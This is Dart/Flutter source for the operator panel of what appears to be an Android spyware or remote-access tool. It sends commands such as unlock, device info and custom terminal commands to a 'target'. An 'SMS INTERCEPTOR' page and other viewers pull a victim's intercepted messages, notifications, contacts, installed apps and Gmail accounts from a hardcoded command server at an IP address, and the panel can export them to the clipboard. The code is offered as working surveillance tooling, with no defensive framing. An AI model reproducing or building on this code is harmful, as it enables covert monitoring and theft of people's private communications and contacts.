                    "UNLOCK",
                    Icons.lock_open,
                    Colors.greenAccent,
                    "unlock",
                    _targetId,
                  ),
                  _btn(
                    "DEVICE INFO",
                    Icons.info,
                    Colors.blueGrey,
                    "get_device_info",
                    _targetId,
                  ),
                ]),

                _groupLabel("⚡ ADVANCED"),
                _actionGrid([
                  _btn(
                    "CUSTOM",
                    Icons.terminal,
                    Colors.white,
                    "",
                    _targetId,
                    isCustom: true,
                  ),
                  _btn(
                    "PING",
                    Icons.network_check,
                    Colors.lightBlue,
                    "ping",
                    _targetId,
                  ),
                ]),
              ],
            ),
          ),
        ],
      ),
    );
  }

  List<dynamic>? _getListData(String key) {
    if (_deviceData[key] is List) {
      return List<dynamic>.from(_deviceData[key]);
    }
    return null;
  }

  Widget _buildQuickStats() {
    return Container(
      margin: const EdgeInsets.only(bottom: 16),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.03),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: Colors.white10),
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _statItem(
            Icons.contact_mail,
            "${_getListData('contacts')?.length ?? 0}",
            "Contacts",
          ),
          _statItem(
            Icons.message,
            "${_getListData('sms')?.length ?? 0}",
            "SMS",
          ),
          _statItem(Icons.apps, "${_getListData('apps')?.length ?? 0}", "Apps"),
          _statItem(
            Icons.email,
            "${_getListData('accounts')?.length ?? 0}",
            "Gmails",
          ),
        ],
      ),
    );
  }

  Widget _statItem(IconData icon, String value, String label) {
    return Column(
      children: [
        Icon(icon, color: Colors.orange, size: 20),
        const SizedBox(height: 4),
        Text(
          value,
          style: const TextStyle(
            color: Colors.white,
            fontSize: 14,
            fontWeight: FontWeight.bold,
          ),
        ),
        Text(label, style: TextStyle(color: Colors.grey[500], fontSize: 9)),
      ],
    );
  }

  IconData _getBatteryIcon(int level) {
    if (level >= 90) return Icons.battery_full;
    if (level >= 70) return Icons.battery_5_bar;
    if (level >= 50) return Icons.battery_4_bar;
    if (level >= 30) return Icons.battery_3_bar;
    if (level >= 15) return Icons.battery_2_bar;
    return Icons.battery_1_bar;
  }

  Color _getBatteryColor(int level) {
    if (level >= 50) return Colors.green;
    if (level >= 20) return Colors.orange;
    return Colors.red;
  }

  Widget _buildTerminalLogs() {
    return Container(
      height: 140,
      width: double.infinity,
      margin: const EdgeInsets.all(10),
      padding: const EdgeInsets.all(10),
      decoration: BoxDecoration(
        color: Colors.black87,
        borderRadius: BorderRadius.circular(8),
        border: Border.all(
          color: _isConnected
              ? Colors.green.withOpacity(0.5)
              : Colors.red.withOpacity(0.5),
        ),
        boxShadow: [
          BoxShadow(
            color: (_isConnected ? Colors.green : Colors.red).withOpacity(0.1),
            blurRadius: 10,
            spreadRadius: 2,
          ),
        ],
      ),
      child: ListView.builder(
        controller: _logScrollController,
        reverse: true,
        itemCount: _executionLogs.length,
        itemBuilder: (context, i) {
          final log = _executionLogs[_executionLogs.length - 1 - i];
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 2),
            child: Row(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  "[${_formatTime(log.timestamp)}]",
                  style: TextStyle(
                    color: Colors.grey[600],
                    fontSize: 9,
                    fontFamily: 'monospace',
                  ),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    log.message,
                    style: TextStyle(
                      color: _getLogColor(log.type),
                      fontSize: 10,
                      fontFamily: 'monospace',
                    ),
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }
}

enum LogType { info, success, error, warning, notification, location, debug }

class LogEntry {
  final DateTime timestamp;
  final String message;
  final LogType type;

  LogEntry({
    required this.timestamp,
    required this.message,
    required this.type,
  });
}

class SmsChatViewerPage extends StatefulWidget {
  final String targetId;
  final List<dynamic>? initialData;

  const SmsChatViewerPage({
    super.key,
    required this.targetId,
    this.initialData,
  });

  @override
  State<SmsChatViewerPage> createState() => _SmsChatViewerPageState();
}

class _SmsChatViewerPageState extends State<SmsChatViewerPage> {
  List<dynamic> _sms = [];
  bool _isLoading = true;
  String _searchQuery = "";

  @override
  void initState() {
    super.initState();
    if (widget.initialData != null && widget.initialData!.isNotEmpty) {
      _sms = widget.initialData!;
      _isLoading = false;
    } else {
      _fetch();
    }
  }

  Future<void> _fetch() async {
    setState(() => _isLoading = true);
    try {
      final res = await http
          .get(
            Uri.parse(
              "http://188.166.176.83:10733/api/get-response/${widget.targetId}",
            ),
          )
          .timeout(const Duration(seconds: 10));

      if (res.statusCode == 200 && mounted) {
        final decoded = jsonDecode(res.body);
        final remoteData = decoded['data'] != null ? decoded['data'] : decoded;

        List<dynamic> combinedSms = [];

        if (remoteData['sms'] is List) {
          combinedSms.addAll(remoteData['sms']);
        }

        if (remoteData['notifications'] is List) {
          for (var n in remoteData['notifications']) {
            combinedSms.add({
              'address': n['title'] ?? n['app'],
              'body': n['body'] ?? n['message'],
              'date': n['timestamp'],
            });
          }
        }

        combinedSms.sort((a, b) {
          int dateA = a['date'] is int
              ? a['date']
              : (int.tryParse(a['date']?.toString() ?? '0') ?? 0);
          int dateB = b['date'] is int
              ? b['date']
              : (int.tryParse(b['date']?.toString() ?? '0') ?? 0);
          return dateB.compareTo(dateA);
        });

        setState(() {
          _sms = combinedSms;
          _isLoading = false;
        });
      }
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  List<dynamic> get _filteredSms {
    if (_searchQuery.isEmpty) return _sms;
    return _sms.where((sms) {
      String address = (sms['address'] ?? "").toLowerCase();
      String body = (sms['body'] ?? "").toLowerCase();
      return address.contains(_searchQuery.toLowerCase()) ||
          body.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  @override
  Widget build(BuildContext context) {
    final filtered = _filteredSms;

    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            const Text(
              "SMS INTERCEPTOR",
              style: TextStyle(color: Colors.white, fontSize: 16),
            ),
            Text(
              "${filtered.length} messages",
              style: TextStyle(color: Colors.grey[500], fontSize: 11),
            ),
          ],
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.grey),
            onPressed: _fetch,
          ),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(50),
          child: Padding(
            padding: const EdgeInsets.all(8),
            child: TextField(
              style: const TextStyle(color: Colors.white, fontSize: 12),
              decoration: InputDecoration(
                hintText: "Search by number or message...",
                hintStyle: TextStyle(color: Colors.grey[600], fontSize: 12),
                prefixIcon: const Icon(
                  Icons.search,
                  color: Colors.grey,
                  size: 18,
                ),
                filled: true,
                fillColor: Colors.white10,
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: BorderSide.none,
                ),
                contentPadding: const EdgeInsets.symmetric(
                  horizontal: 12,
                  vertical: 8,
                ),
              ),
              onChanged: (value) => setState(() => _searchQuery = value),
            ),
          ),
        ),
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator(color: Colors.pink))
          : filtered.isEmpty
          ? Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  const Icon(
                    Icons.comments_disabled,
                    color: Colors.grey,
                    size: 48,
                  ),
                  const SizedBox(height: 16),
                  Text(
                    _searchQuery.isEmpty ? "No messages" : "No results found",
                    style: const TextStyle(color: Colors.grey),
                  ),
                ],
              ),
            )
          : ListView.builder(
              itemCount: filtered.length,
              itemBuilder: (context, i) {
                final sms = filtered[i];
                return Container(
                  margin: const EdgeInsets.symmetric(
                    horizontal: 8,
                    vertical: 2,
                  ),
                  decoration: const BoxDecoration(
                    border: Border(bottom: BorderSide(color: Colors.white10)),
                  ),
                  child: ListTile(
                    leading: CircleAvatar(
                      backgroundColor: Colors.pink.withOpacity(0.2),
                      child: Text(
                        (sms['address'] ?? "?")[0].toUpperCase(),
                        style: const TextStyle(color: Colors.pink),
                      ),
                    ),
                    title: Text(
                      sms['address'] ?? "Unknown",
                      style: const TextStyle(color: Colors.pink, fontSize: 13),
                    ),
                    subtitle: Text(
                      sms['body'] ?? "",
                      style: const TextStyle(
                        color: Colors.white70,
                        fontSize: 12,
                      ),
                      maxLines: 3,
                      overflow: TextOverflow.ellipsis,
                    ),
                    trailing: sms['date'] != null
                        ? Text(
                            _formatTimestamp(sms['date']),
                            style: TextStyle(
                              color: Colors.grey[600],
                              fontSize: 9,
                            ),
                          )
                        : null,
                    onTap: () => _showSmsDetail(sms),
                  ),
                );
              },
            ),
    );
  }

  String _formatTimestamp(dynamic timestamp) {
    try {
      DateTime date;
      if (timestamp is int) {
        date = DateTime.fromMillisecondsSinceEpoch(timestamp);
      } else if (timestamp is String) {
        date = DateTime.parse(timestamp);
      } else {
        return "";
      }
      return "${date.day}/${date.month}/${date.year} ${date.hour}:${date.minute.toString().padLeft(2, '0')}";
    } catch (e) {
      return "";
    }
  }

  void _showSmsDetail(dynamic sms) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: Colors.grey[900],
        title: Row(
          children: [
            const Icon(Icons.message, color: Colors.pink, size: 20),
            const SizedBox(width: 8),
            Expanded(
              child: Text(
                sms['address'] ?? "Unknown",
                style: const TextStyle(color: Colors.pink, fontSize: 14),
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: Colors.black54,
                borderRadius: BorderRadius.circular(8),
              ),
              child: SelectableText(
                sms['body'] ?? "No content",
                style: const TextStyle(color: Colors.white, fontSize: 13),
              ),
            ),
            const SizedBox(height: 12),
            Text(
              "Received: ${_formatTimestamp(sms['date'])}",
              style: TextStyle(color: Colors.grey[600], fontSize: 10),
            ),
          ],
        ),
        actions: [
          TextButton.icon(
            onPressed: () {
              Clipboard.setData(ClipboardData(text: sms['body'] ?? ""));
              Navigator.pop(context);
            },
            icon: const Icon(Icons.copy, size: 16),
            label: const Text("COPY"),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text("CLOSE"),
          ),
        ],
      ),
    );
  }
}

class DataViewerPage extends StatefulWidget {
  final String title;
  final String cmd;
  final String targetId;
  final List<dynamic>? data;

  const DataViewerPage({
    super.key,
    required this.title,
    required this.cmd,
    required this.targetId,
    this.data,
  });

  @override
  State<DataViewerPage> createState() => _DataViewerPageState();
}

class _DataViewerPageState extends State<DataViewerPage> {
  List<dynamic> _list = [];
  bool _isLoading = true;
  String _searchQuery = "";

  @override
  void initState() {
    super.initState();
    // FIXED: Jika data dari memori kosong, paksa request ke API server
    if (widget.data != null && widget.data!.isNotEmpty) {
      _list = widget.data!;
      _isLoading = false;
    } else {
      _fetch();
    }
  }

  Future<void> _fetch() async {
    setState(() => _isLoading = true);
    try {
      final res = await http
          .get(
            Uri.parse(
              "http://188.166.176.83:10733/api/get-response/${widget.targetId}",
            ),
          )
          .timeout(const Duration(seconds: 10));

      if (res.statusCode == 200 && mounted) {
        final decoded = jsonDecode(res.body);
        final remoteData = decoded['data'] != null ? decoded['data'] : decoded;

        String key = widget.cmd == "get_apps" ? "apps" : "contacts";

        setState(() {
          _list = remoteData[key] is List ? remoteData[key] : [];
          _isLoading = false;
        });
      }
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  List<dynamic> get _filteredList {
    if (_searchQuery.isEmpty) return _list;
    return _list.where((item) {
      String name = (item['name'] ?? "").toLowerCase();
      String secondary = widget.cmd == "get_apps"
          ? (item['package'] ?? "").toLowerCase()
          : (item['num'] ?? "").toLowerCase();
      return name.contains(_searchQuery.toLowerCase()) ||
          secondary.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  IconData get _iconData {
    return widget.cmd == "get_apps" ? Icons.android : Icons.person;
  }

  Color get _iconColor {
    return widget.cmd == "get_apps" ? Colors.teal : Colors.blue;
  }

  @override
  Widget build(BuildContext context) {
    final filtered = _filteredList;

    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        title: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              widget.title,
              style: const TextStyle(color: Colors.white, fontSize: 16),
            ),
            Text(
              "${filtered.length} items",
              style: TextStyle(color: Colors.grey[500], fontSize: 11),
            ),
          ],
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.grey),
            onPressed: _fetch,
          ),
          IconButton(
            icon: const Icon(Icons.file_download, color: Colors.grey),
            onPressed: _exportData,
          ),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(50),
          child: Padding(
            padding: const EdgeInsets.all(8),
            child: TextField(
              style: const TextStyle(color: Colors.white, fontSize: 12),
              decoration: InputDecoration(
                hintText: "Search...",
                hintStyle: TextStyle(color: Colors.grey[600], fontSize: 12),
                prefixIcon: const Icon(
                  Icons.search,
                  color: Colors.grey,
                  size: 18,
                ),
                filled: true,
                fillColor: Colors.white10,
                border: OutlineInputBorder(
                  borderRadius: BorderRadius.circular(8),
                  borderSide: BorderSide.none,
                ),
                contentPadding: const EdgeInsets.symmetric(
                  horizontal: 12,
                  vertical: 8,
                ),
              ),
              onChanged: (value) => setState(() => _searchQuery = value),
            ),
          ),
        ),
      ),
      body: _isLoading
          ? const Center(child: CircularProgressIndicator(color: Colors.blue))
          : filtered.isEmpty
          ? Center(
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  Icon(_iconData, color: Colors.grey, size: 48),
                  const SizedBox(height: 16),
                  Text(
                    _searchQuery.isEmpty ? "No data" : "No results found",
                    style: const TextStyle(color: Colors.grey),
                  ),
                ],
              ),
            )
          : ListView.builder(
              itemCount: filtered.length,
              itemBuilder: (context, i) {
                final item = filtered[i];
                return ListTile(
                  leading: CircleAvatar(
                    backgroundColor: _iconColor.withOpacity(0.2),
                    child: Icon(_iconData, color: _iconColor, size: 20),
                  ),
                  title: Text(
                    item['name'] ?? "Unknown",
                    style: const TextStyle(color: Colors.white),
                  ),
                  subtitle: Text(
                    widget.cmd == "get_apps"
                        ? item['package'] ?? ""
                        : item['num'] ?? "",
                    style: const TextStyle(color: Colors.white38, fontSize: 11),
                  ),
                );
              },
            ),
    );
  }

  void _exportData() {
    StringBuffer buffer = StringBuffer();
    buffer.writeln("=== ${widget.title} Export ===\n");

    for (var item in _list) {
      buffer.writeln("Name: ${item['name'] ?? 'Unknown'}");
      buffer.writeln(
        "${widget.cmd == "get_apps" ? "Package" : "Number"}: ${widget.cmd == "get_apps" ? item['package'] : item['num']}",
      );
      buffer.writeln("---");
    }

    Clipboard.setData(ClipboardData(text: buffer.toString()));

    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(
        content: Text("Data copied to clipboard"),
        duration: Duration(seconds: 2),
      ),
    );
  }
}
